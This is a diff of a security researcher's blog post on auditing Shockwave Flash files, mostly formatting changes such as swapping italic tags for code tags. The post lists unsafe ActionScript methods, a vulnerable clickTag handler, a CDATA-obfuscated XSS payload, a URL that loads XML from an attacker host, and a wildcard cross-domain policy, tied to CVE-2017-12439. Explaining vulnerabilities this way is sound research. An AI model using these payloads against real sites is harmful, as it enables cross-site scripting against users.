@@ -3,6 +3,9 @@
 <meta name="Description" content="Publications by ret2eax, a security researcher, consultant and enthusiast.">
 <link rel="stylesheet" href="../Resources/css/hack.css">
 <link rel="stylesheet" href="../Resources/css/themes/dark.css">
+<link rel="stylesheet" href="../Resources/highlight/styles/custom.min.css">
+<script src="../Resources/highlight/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
 <title>0x02b: Hunting Bugs via Shockwave Analysis</title>
 </head>
 <p>
@@ -41,7 +44,7 @@ Flash player related vulnerabilities have been notorious in their susceptibility
 As opposed to deep diving into flash exploitation and the various attack vectors. This article will be focusing on a more generic overview prior to presenting my own findings as a reminder as to how Shockwave Flash (SWF) files can pose a threat, their capabilities and the potential attack path associated with the insecure variations being hosted and exposed to the public domain.
 SWF files are created through ActionScript syntax, of which, is very similar to JavaScript as both conform to the ECMA-based syntax. Like any other language, failure to properly validate and sanitize user inputs can leave the segment vulnerable to various attacks. Furthermore, ActionScript itself, contains vulnerabilities associated with it, itself, this includes methods rendered ‘unsafe’, such as, but not limited to:
 <p>#[VULNERABLE ACTIONSCRIPT METHODS] :</p>
-<pre class="hack dark"><i>
+<pre class="hack dark"><code>
 externalInterface.call(); 
 getURL();
 loadVariables();
@@ -50,19 +53,19 @@ loadMovieVar();
 loadMovieNum();
 LoadVars.load;
 LoadVars.send;
- XML.load ( 'url' ); 
+XML.load ( 'url' ); 
 XML.sendAndLoad ( 'url' ); 
 LoadVars.load ( 'url' );
 LoadVars.send ( 'url' ); 
 flash.external.ExternalInterface.call(_root.callback);
 externalInterface.addCallback;
 AddDLL;
-etc..</i>
+// etc </code>
 </pre>
 
 <p>#[INSECURE GLOBAL VARIABLES] :</p>
-<pre class="hack dark"><i>
-_root, _global, _level0</i>
+<pre class="hack dark"><code>
+_root, _global, _level0</code>
 </pre>
 In terms of performing the analysis, SWF files can be decompiled through various tools, a common one being flare. Therefore, exploitation is handled in a white-box mannered approach. Once decompiled a source code analysis can be initiated. There are tools out their which can perform a static-code analysis in an automated manner, however, they often miss many insecurities. Therefore, it is recommended that a more manual approach be taken. Since ActionScript is a straight forward language, only basic knowledge of its structure, methods and syntax is required.
 
@@ -70,14 +73,14 @@ The main objective with the code analysis is to get an overview of the code flow
 
 For example, see a vulnerable decompiled source below:
 <pre class="hack dark">
-<i>
+<code>
 button 48 {
 	on (release) {
 		var str = (_level0.clickTag != undefined) ? _level0.clickTag
 			getURL(str, '');
 	}
    }
-</i>
+</code>
 </pre>
 <p>The above illustrates a vulnerability pertinent to the clickTag flashvar. An analysis on the above can be observed <a href="posts/ASD-XSSposed.html">here</a>.<p>
 <p>Vulnerabilities that could exist within Shockwave Flash files include; SOME attacks, Content Forgery, Unvalidated Redirects, as well as, XSS.</p>
@@ -86,22 +89,22 @@ button 48 {
 </p>
 
 <p>#[EXPLOITING VULNERABLE XML CONFIGURATIONS THROUGH CDATA] :</p>
-<pre class="hack dark">
-&lt;![CDATA[<]]>script&lt;![CDATA[>]]>alert('xss')&lt;![CDATA[<]]>/script&lt;![CDATA[>]]>
+<pre class="hack dark"><code>
+&lt;![CDATA[<]]>script&lt;![CDATA[>]]>alert('xss')&lt;![CDATA[<]]>/script&lt;![CDATA[>]]></code>
 </pre>
 
 This would then be called in the manner of:<br>
-	http://example.com/swf/example.swf?xml_path=//attacker.com/poc.xml
+	http://example.com/swf/example.swf?xml_path=//attacker/poc.xml
 
 <p>It should be noted that as a precondition, a permissive cross-domain policy needs to be configured:</p>
-<pre class="hack dark">
+<pre class="hack dark"><code>
 &lt;?xml version="1.0"?>
 &lt;!DOCTYPE cross-domain-policy SYSTEM "http://www.adobe.com/xml/dtds/cross-domain-policy.dtd">
 &lt;cross-domain-policy>
 &lt;site-control permitted-cross-domain-policies="all"/>
 &lt;allow-access-from domain="*" secure="false"/>
 &lt;allow-http-request-headers-from domain="*" headers="*" secure="false"/>
-&lt;/cross-domain-policy>
+&lt;/cross-domain-policy></code>
 </pre>
 <p>I identified this issue within many SWF generators and slideshow makers, including that of a Windows application titled <a href="https://www.flash-slideshow-maker.com/">Flash Slideshow Maker Professional</a>, with version 5.20 and below being vulnerable in the way they handle 'advanced' file behaviour. See <a href="cve-2017-12439.html">CVE-2017-12439</a> for more information.
 </p><p> ~ ret2eax</p>
